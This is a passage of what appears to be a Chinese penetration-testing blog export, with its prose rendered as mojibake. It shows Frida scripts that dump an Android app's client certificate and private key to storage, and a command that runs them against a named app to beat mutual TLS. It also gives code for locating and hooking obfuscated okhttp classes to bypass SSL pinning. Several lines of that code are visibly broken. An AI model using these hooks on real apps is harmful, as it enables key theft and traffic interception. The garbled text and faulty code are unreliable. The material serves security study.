class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getPrivateKey</span>()</span><br><span class="line">            <span class="keyword">var</span> packageName = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">currentApplication</span>().<span class="title function_">getApplicationContext</span>().<span class="title function_">getPackageName</span>();</span><br><span class="line">            <span class="title function_">storeP12</span>(<span class="variable language_">this</span>.<span class="title function_">getPrivateKey</span>(), <span class="variable language_">this</span>.<span class="title function_">getCertificate</span>(), <span class="string">&#x27;/sdcard/Download/&#x27;</span> + packageName + <span class="string">&#x27;.p12&#x27;</span>, <span class="string">&#x27;r0ysue&#x27;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;dumpClinetCertificate=&gt;&quot;</span> + <span class="string">&#x27;/sdcard/Download/&#x27;</span> + packageName + <span class="string">&#x27;.p12&#x27;</span> + <span class="string">&#x27;   pwd: r0ysue&#x27;</span>); </span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore$PrivateKeyEntry&quot;</span>).<span class="property">getCertificateChain</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getCertificateChain</span>()</span><br><span class="line">            <span class="keyword">var</span> packageName = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>).<span class="title function_">currentApplication</span>().<span class="title function_">getApplicationContext</span>().<span class="title function_">getPackageName</span>();</span><br><span class="line">            <span class="title function_">storeP12</span>(<span class="variable language_">this</span>.<span class="title function_">getPrivateKey</span>(), <span class="variable language_">this</span>.<span class="title function_">getCertificate</span>(), <span class="string">&#x27;/sdcard/Download/&#x27;</span> + packageName  + <span class="string">&#x27;.p12&#x27;</span>, <span class="string">&#x27;r0ysue&#x27;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;dumpClinetCertificate=&gt;&quot;</span> + <span class="string">&#x27;/sdcard/Download/&#x27;</span> + packageName  + <span class="string">&#x27;.p12&#x27;</span> + <span class="string">&#x27;   pwd: r0ysue&#x27;</span>); </span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p>FridaåŠ è½½ä¸Šé¢çš„ä»£ç ï¼Œæ¥å®ç°å¯†é’¥è¯ä¹¦è‡ªåï¼š</p><p>ã€æ³¨æ„ã€‘è¿™å—æœ€å¥½ä½¿ç”¨spawnçš„æ–¹å¼ï¼Œå› ä¸ºAPPå·²ç»åˆå§‹åŒ–äº†ï¼Œä½¿ç”¨attaché™„åŠ çš„æ–¹å¼å¯èƒ½dumpä¸ä¸‹æ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida -U -f com.soulapp.android -l saveCertificate.js   --no-pause</span><br></pre></td></tr></table></figure><p>è¿è¡Œä»£ç åï¼Œå‘ç°æ²¡æœ‰ä»»ä½•ååº”ï¼Œä¹Ÿæ²¡æœ‰æ‰“å°console.log</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071812132.png" alt="img"> </p><p>è¿™æ˜¯å› ä¸ºè¿˜åœ¨å¼€ç€æŠ“åŒ…è½¯ä»¶ï¼Œå¯¼è‡´æˆ‘ä»¬ä¸èƒ½æ­£å¸¸è®¿é—®APPï¼Œå…³é—­æŠ“åŒ…åï¼ŒæˆåŠŸdumpä¸‹æ¥äº†è¯ä¹¦ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071812706.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071812174.png" alt="image.png"> </p><p>è¯ä¹¦æ–‡ä»¶è¯¦æƒ…ï¼Œå¯ä»¥ä½¿ç”¨keystoreæŸ¥çœ‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071813634.png" alt="image.png"> </p><h2 id="5-æŠ“åŒ…è½¯ä»¶é…ç½®å®¢æˆ·ç«¯è¯ä¹¦"><a href="#5-æŠ“åŒ…è½¯ä»¶é…ç½®å®¢æˆ·ç«¯è¯ä¹¦" class="headerlink" title="5. æŠ“åŒ…è½¯ä»¶é…ç½®å®¢æˆ·ç«¯è¯ä¹¦"></a>5. æŠ“åŒ…è½¯ä»¶é…ç½®å®¢æˆ·ç«¯è¯ä¹¦</h2><p>è¿™å—ä»¥Charlesä¸ºä¾‹ï¼Œå…¶ä»–çš„ç±»ä¼¼ã€‚ã€‚ã€‚</p><p>åœ¨charlesä¸­æ·»åŠ APPå®¢æˆ·ç«¯è¯ä¹¦ï¼Œå¯ä»¥è¿‡æœåŠ¡ç«¯æ ¡éªŒã€‚ã€‚ã€‚</p><p>è¿™å—å°†åˆšåˆšä½¿ç”¨Frida dumpä¸‹æ¥çš„è¯ä¹¦ï¼ŒåŠ è½½åˆ°charlesä¸­ã€‚ï¼ˆcharlesæ˜¯æ”¯æŒå®¢æˆ·ç«¯è¯ä¹¦å¯¼å…¥çš„ï¼‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071814844.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071814266.png" alt="image.png"> </p><p>å—çš„å¯†ç å¯ä»¥éšä¾¿è®¾ç½®ï¼Œå°±å…ˆè®¾ç½®ä¸º â€œ12345â€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071814607.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071814129.png" alt="image.png"> </p><p>ç‚¹å‡»ã€Addã€‘è¿›è¡Œè¯ä¹¦å¯¼å…¥ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071814985.png" alt="image.png"> </p><p>é‡æ–°æŠ“åŒ…ï¼Œå‘ç°å¯ä»¥æˆåŠŸæŠ“åŒ…äº†ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071814577.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APPæŠ“åŒ… </tag>
            
            <tag> åŒå‘è¯ä¹¦æ ¡éªŒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŠ“åŒ…è¿›é˜¶ä¹‹é€šæ€okhttpè¯ä¹¦</title>
      <link href="/2024/07/07/%E6%8A%93%E5%8C%85%E8%BF%9B%E9%98%B6%E4%B9%8B%E9%80%9A%E6%9D%80okhttp%E8%AF%81%E4%B9%A6/"/>
      <url>/2024/07/07/%E6%8A%93%E5%8C%85%E8%BF%9B%E9%98%B6%E4%B9%8B%E9%80%9A%E6%9D%80okhttp%E8%AF%81%E4%B9%A6/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-é€šæ€okhttp-ssl-pinningæ€è·¯"><a href="#0x01-é€šæ€okhttp-ssl-pinningæ€è·¯" class="headerlink" title="0x01 é€šæ€okhttp-ssl-pinningæ€è·¯"></a>0x01 é€šæ€okhttp-ssl-pinningæ€è·¯</h1><p>æ‰€è°“é€šæ€ï¼šå°±æ˜¯ä¸ç®¡æœ‰æ²¡æœ‰æ··æ·†ï¼Œéƒ½å¯ä»¥å°†å¯¹åº”çš„ç±»è¯†åˆ«å‡ºæ¥ã€‚ã€‚ã€‚</p><p>æœ¬è´¨ä¸Šè¿˜æ˜¯hookå¯¹åº”çš„ç±»ï¼Œå¯¹åº”çš„æ–¹æ³•ã€‚ä½†æ˜¯è¿™äº›æ–¹æ³•å’Œç±»éƒ½æ˜¯åšäº†æ··æ·†å¤„ç†çš„ï¼Œæ€ä¹ˆåœ¨æ‰€æœ‰ç±»ä¸­è¯†åˆ«å‡ºæ¥ç‰¹å®šçš„ç±»å’Œæ–¹æ³•æ˜¯é€šæ€çš„å…³é”®ã€‚ã€‚ã€‚</p><h2 id="ç¬¬ä¸€æ¬¡æ ¡éªŒï¼šX509TrustManager"><a href="#ç¬¬ä¸€æ¬¡æ ¡éªŒï¼šX509TrustManager" class="headerlink" title="ç¬¬ä¸€æ¬¡æ ¡éªŒï¼šX509TrustManager"></a>ç¬¬ä¸€æ¬¡æ ¡éªŒï¼š<code>X509TrustManager</code></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OKHttpClient.Builder builder = new OKHttpClient.Builder();</span><br><span class="line">builder.sslSocketFactory(factory, (X509TrustManager) trustManagers[0])</span><br></pre></td></tr></table></figure><p><code>X509TrustManager</code>æ˜¯<code>TrustManager</code>æ¥å£çš„ä¸€ä¸ªå®ç°ç±»ï¼Œä¸»è¦æ ¡éªŒæ˜¯é€šè¿‡<code>TrustManager</code>æ¥å£ä¸‹çš„<code>checkServerTrusted</code>å‡½æ•°ã€‚</p><p><code>X509TrustManager</code>æ˜¯é€šè¿‡å¯¹<code>checkServerTrusted</code>å‡½æ•°è¿›è¡Œé‡æ–°å®ç°<code>SSLPinning</code>ã€‚</p><p>ä¸ŠèŠ‚è¯¾çš„hookæ€è·¯ä¸ºï¼šåªè¦æ˜¯å®ç°äº†<code>TrustManager</code>æ¥å£çš„ç±»ï¼Œéƒ½hooké‡Œé¢çš„<code>checkServerTrusted</code>æ–¹æ³•ã€‚</p><p>æœ¬èŠ‚è¯¾æ¢æ€è·¯ï¼šHookæ‰<code>sslSocketFactory</code>æ–¹æ³•ï¼Œå°†é‡Œé¢çš„factoryæ›¿æ¢æˆ‘ä»¬è‡ªå·±çš„factory</p><ul><li>factoryæ˜¯è¯ä¹¦ä¿¡ä»»å·¥å‚</li><li>å¯ä»¥è‡ªå®šä¹‰factoryï¼Œè®©å…¶ä¿¡ä»»æ‰€æœ‰</li></ul><h2 id="ç¬¬äºŒæ¬¡æ ¡éªŒï¼šcertificatePinner"><a href="#ç¬¬äºŒæ¬¡æ ¡éªŒï¼šcertificatePinner" class="headerlink" title="ç¬¬äºŒæ¬¡æ ¡éªŒï¼šcertificatePinner"></a>ç¬¬äºŒæ¬¡æ ¡éªŒï¼š<code>certificatePinner</code></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CertificatePinner.Builder cerBuilder = new CertificatePinner.Builder();</span><br><span class="line">//ä¸‹é¢4æ¡,å¯¹åº” &quot;.taobao.com åŸŸåçš„å…¬é’¥</span><br><span class="line">cerBuilder.add(&quot;*.taobao.com&quot;,CertificatePinner.pin(cerBuilder))</span><br><span class="line">cerBuilder.add(&quot;*.taobao.com&quot;, &quot;sha256/IfXz1a0gWBA5oH+zasmRutUiyoZN3I8wLxHNQxk3NVo=&quot;)</span><br><span class="line">cerBuilder.add(&quot;*.taobao.com&quot;, &quot;sha256/IQBnNBEiFuhj+8x6X8XLgh01V9Ic5/V3IRQLNFFc7v4=&quot;)</span><br><span class="line">cerBuilder.add(&quot;*.taobao.com&quot;, &quot;sha256/K87oWBWM9UZfyddvDfoxL+8lpNyoUB2ptGtn0fv6G2Q=&quot;)</span><br><span class="line"></span><br><span class="line">builder.cerBuilderPinner(cerBuilder.builder())</span><br></pre></td></tr></table></figure><p>ä¸ŠèŠ‚è¯¾æ€è·¯ï¼šHookæ‰<code>CertificatePinner.Builder</code>ç±»çš„addæ–¹æ³•ï¼Œå°†å…¶ç½®ç©º</p><p>æœ¬èŠ‚è¯¾æ€è·¯ï¼šåŒä¸Šï¼ŒHookæ‰<code>cerBuilderPinner</code>æ–¹æ³•ï¼Œå°†å…¶å‚æ•°<code>cerBuilder.builder()</code>ç½®ç©º</p><h2 id="ç¬¬ä¸‰æ¬¡æ ¡éªŒï¼šhostnameVerify"><a href="#ç¬¬ä¸‰æ¬¡æ ¡éªŒï¼šhostnameVerify" class="headerlink" title="ç¬¬ä¸‰æ¬¡æ ¡éªŒï¼šhostnameVerify"></a>ç¬¬ä¸‰æ¬¡æ ¡éªŒï¼š<code>hostnameVerify</code></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">builder.hostnameVerifier(new HostnameVerify)&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public boolean verify(String hostname, SSLSession session)&#123;  //ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œhostname:æœåŠ¡å™¨åŸŸå  session:ä¼šè¯ä¿¡æ¯ï¼Œé‡Œé¢ä¼šåŒ…å«è¯ä¹¦ç›¸å…³å†…å®¹</span><br><span class="line">        if (hostname.equals(&#x27;www.baidu.com&#x27;))&#123;  //é¦–å…ˆåˆ¤æ–­hostnameæ˜¯å¦ä¸ºwww.baidu.com(è¿™å—éšä¾¿å†™çš„)</span><br><span class="line">            try&#123;</span><br><span class="line">                Certificate[] peerCertificates = session.getPeerCertificates();  //ä»sessionè·å–åˆ°æœåŠ¡å™¨ç«¯è¯ä¹¦ç›¸å…³ä¿¡æ¯</span><br><span class="line">                if(peerCertificates[0].getPublicKey().equals(myCertificate.getPublicKey()))&#123;  //åˆ¤æ–­æœåŠ¡å™¨ç«¯è¯ä¹¦å…¬é’¥æ˜¯å¦å’Œæœ¬åœ°è¯ä¹¦å…¬é’¥ä¸€æ ·</span><br><span class="line">                    return true;    //è‹¥åŒ¹é…æˆåŠŸåˆ™æ ¡éªŒé€šè¿‡ï¼Œæ ¡éªŒå¤±è´¥ï¼Œä¹Ÿå°±æ„å‘³æŠ“ä¸åˆ°åŒ…</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;catch(SSLPeerUnverifiedException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬èŠ‚è¯¾æ€è·¯ï¼šHookæ‰<code>hostnameVerifier</code>æ–¹æ³•ï¼Œå°†é‡Œé¢çš„å‚æ•°<code>HostnameVerify</code>æ›¿æ¢ä¸ºæˆ‘ä»¬è‡ªå·±çš„</p><h1 id="0x02-X509TrustManagerå®ç°"><a href="#0x02-X509TrustManagerå®ç°" class="headerlink" title="0x02 X509TrustManagerå®ç°"></a>0x02 X509TrustManagerå®ç°</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OKHttpClient.Builder builder = new OKHttpClient.Builder();</span><br><span class="line">builder.sslSocketFactory(factory, (X509TrustManager) trustManagers[0])</span><br></pre></td></tr></table></figure><p>æœ¬èŠ‚è¯¾æ¢æ€è·¯ï¼šHookæ‰sslSocketFactoryæ–¹æ³•ï¼Œå°†é‡Œé¢çš„factoryæ›¿æ¢æˆ‘ä»¬è‡ªå·±çš„factory</p><p>1ã€builderæ˜¯<code>OKHttpClient</code>çš„ä¸€ä¸ªå†…éƒ¨ç±»ï¼Œæ­£å¸¸æƒ…å†µä¸‹ç›´æ¥<code>Java.use(&quot;OKHttp3.OKHttpClient$builder&quot;)</code>å³å¯</p><p>2ã€é’ˆå¯¹æœ‰æ··æ·†çš„æƒ…å†µï¼Œå¦‚ä½•å®šä½åˆ°<code>OKHttpClient</code>è¿™ä¸ªç±»å‘¢ï¼Ÿï¼Ÿï¼Ÿ</p><p>åŸç†ï¼šå¯ä»¥é€šè¿‡è¿™ç±»å®ç°äº†å“ªäº›æ¥å£ï¼Œè¿™ä¸ªç±»å¯¹åº”çš„æ–¹æ³•æœ‰ä»€ä¹ˆå‡ ä¸ªå‚æ•°ç­‰ç­‰ã€‚å¦‚<code>OKHttpClient</code>è¿™ä¸ªç±»æ˜¯ä¸€ä¸ªpublicç±»ï¼Œæ²¡æœ‰staticå’Œfinalï¼›åŒ…åä¸º<code>OKHttp3</code>åªæœ‰ä¸€å±‚ç­‰ç­‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407091034330.png" alt="image.png"> </p><p>æœ¬è´¨ï¼šæˆ‘ä»¬é€šè¿‡è¿™ä¸ªç±»çš„ç›¸å…³ç‰¹å¾ï¼Œæ¥å¯¹ä»–è¿›è¡Œè¯†åˆ«ï¼</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> classNames = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="comment">//å®šä¹‰äº†ä¸‰ä¸ªå˜é‡ï¼Œèµ‹å€¼ä¸ºç©º</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">OkhttpClinetClassName</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">CertificatePinnerClassName</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> perfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œéå†å†…å­˜ä¸­çš„æ‰€æœ‰ç±»ï¼Œå°†æ‰€æœ‰ç±»åæ”¾å…¥æ•°ç»„ä¸­ã€‚</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadClasses</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">clasName,handle</span>)&#123;</span><br><span class="line">                classNames.<span class="title function_">push</span>(clasName)</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Search classes complete!&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findOkHttpClass</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Modifier</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.reflect.Modifier&quot;</span>)  <span class="comment">//åå°„æ¡†æ¶æä¾›çš„ä¸€ä¸ªç±»ï¼Œå¯ä»¥åˆ¤æ–­å½“å‰è¿™ä¸ªç±»çš„ä¸€äº›å±æ€§ï¼Œå¦‚finalã€staticç­‰</span></span><br><span class="line">        <span class="comment">//åˆ¤è¯»è¿™ä¸ªç±»æ˜¯å¦æ˜¯okhttp3.OkHttpClient</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">isOkhttpClient</span>(<span class="params">clasName</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clasName.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="property">length</span> != <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clas = <span class="title class_">Java</span>.<span class="title function_">use</span>(clasName);</span><br><span class="line">                <span class="keyword">var</span> interfaces = clas.<span class="property">class</span>.<span class="title function_">getInterfaces</span>(); <span class="comment">//é€šè¿‡åå°„è·å–å½“å‰ç±»çš„æ¥å£</span></span><br><span class="line">                <span class="keyword">var</span> count = interfaces.<span class="property">length</span>;  <span class="comment">//è·å–å½“å‰ç±»çš„æ¥å£æ•°é‡</span></span><br><span class="line">                <span class="keyword">if</span> (count &lt; <span class="number">2</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> flag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; count; i++)&#123;</span><br><span class="line">                    <span class="keyword">var</span> interface_ = interfaces[i];</span><br><span class="line">                    <span class="keyword">var</span> interface_Name = interface_.<span class="title function_">getName</span>();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (interface_Name.<span class="title function_">indexOf</span>(<span class="string">&quot;Cloneable&quot;</span>) &gt; <span class="number">0</span>)&#123;  <span class="comment">//OkHttpClasså®ç°äº†Cloneableæ¥å£</span></span><br><span class="line">                        flag = <span class="literal">true</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (interface_Name.<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &lt;= <span class="number">0</span>)&#123;  <span class="comment">//&quot;$&quot;ä»£è¡¨å†…éƒ¨ç±»ï¼Œä¸å±äºokhttp3çš„ç±»ï¼Œè¿”å›false</span></span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!flag)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clas.<span class="property">class</span>.<span class="title function_">getDeclaringClass</span>().<span class="property">length</span> = <span class="number">0</span>)&#123;   <span class="comment">//åˆ¤æ–­å½“å‰ç±»ä¸­å†…éƒ¨ç±»çš„ä¸ªæ•°ï¼Œå¦‚æœæ²¡æœ‰è¿”å›false</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clas.<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;java.lang.Object&quot;</span>) &lt; <span class="number">0</span>)&#123;  <span class="comment">//åˆ¤æ–­å½“å‰ç±»æ˜¯å¦ç»§æ‰¿äº†Objectç±»ï¼Œå¦‚æœæ²¡æœ‰è¿”å›false)</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">//å¦‚æœå½“å‰ç±»æ˜¯okhttp3.OkHttpClientç±»çš„å‰ç¼€ï¼Œå¹¶ä¸”å®ç°äº†okhttp3.OkHttpClientæ¥å£ï¼Œå¹¶ä¸”æ²¡æœ‰å†…éƒ¨ç±»ï¼Œå¹¶ä¸”ç»§æ‰¿äº†Objectç±»ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºæ˜¯okhttp3.OkHttpClientç±»</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">isCertificatePinner</span>(<span class="params">clasName,perfix</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!clasName.<span class="title function_">startsWith</span>(perfix))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clasName.<span class="title function_">indexOf</span>(<span class="string">&#x27;$&#x27;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clasName.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>.<span class="property">length</span> != <span class="number">2</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(clasName);</span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">getInterfaces</span>().<span class="property">length</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">getDeclaringClass</span>().<span class="property">length</span> = <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>() != <span class="string">&quot;java.lang.Object&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title class_">Modifier</span>.<span class="title function_">isFinal</span>(cls.<span class="property">class</span>.<span class="title function_">getModifiers</span>()))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> flag=<span class="literal">false</span></span><br><span class="line">            <span class="keyword">var</span> methods = cls.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();    <span class="comment">//è·å–å½“å‰ç±»çš„æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; methods.<span class="property">length</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> method = methods[i];     <span class="comment">//è·å–å½“å‰æ–¹æ³•</span></span><br><span class="line">                <span class="keyword">if</span> (method.<span class="title function_">getParameterCount</span>() &lt; <span class="number">1</span>)&#123;</span><br><span class="line">                    couninue;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (method.<span class="title function_">getParameterTypes</span>()[<span class="number">0</span>].<span class="title function_">getName</span>() != <span class="string">&quot;java.security.cert.Certificate&quot;</span>)&#123;</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!flag)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            flag=<span class="literal">false</span></span><br><span class="line">            <span class="keyword">var</span> filed = cls.<span class="property">class</span>.<span class="title function_">getDeclaredFields</span>();    <span class="comment">//è·å–å½“å‰ç±»çš„æ‰€æœ‰å­—æ®µ    </span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; filed.<span class="property">length</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> field = filed[i];     <span class="comment">//è·å–å½“å‰å­—æ®µ</span></span><br><span class="line">                <span class="keyword">if</span> (field.<span class="title function_">getType</span>().<span class="title function_">getName</span>() == <span class="string">&quot;java.util.set&quot;</span>)&#123;  <span class="comment">//åˆ¤æ–­å½“å‰å­—æ®µæ˜¯å¦æ˜¯setç±»å‹</span></span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!flag)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//console.log(&quot;Find CertificatePinnerClassName: &quot; + clasName)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">//å¦‚æœå½“å‰ç±»æ˜¯okhttp3.CertificatePinnerç±»çš„å‰ç¼€ï¼Œå¹¶ä¸”æ²¡æœ‰å†…éƒ¨ç±»ï¼Œå¹¶ä¸”æ²¡æœ‰æ¥å£ï¼Œå¹¶ä¸”ç»§æ‰¿äº†Objectç±»ï¼Œå¹¶ä¸”æ˜¯finalçš„ï¼Œå¹¶ä¸”æœ‰setç±»å‹å­—æ®µï¼Œå¹¶ä¸”æœ‰æ–¹æ³•å‚æ•°ä¸ºCertificateç±»å‹ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºæ˜¯okhttp3.CertificatePinnerç±»</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classNames.<span 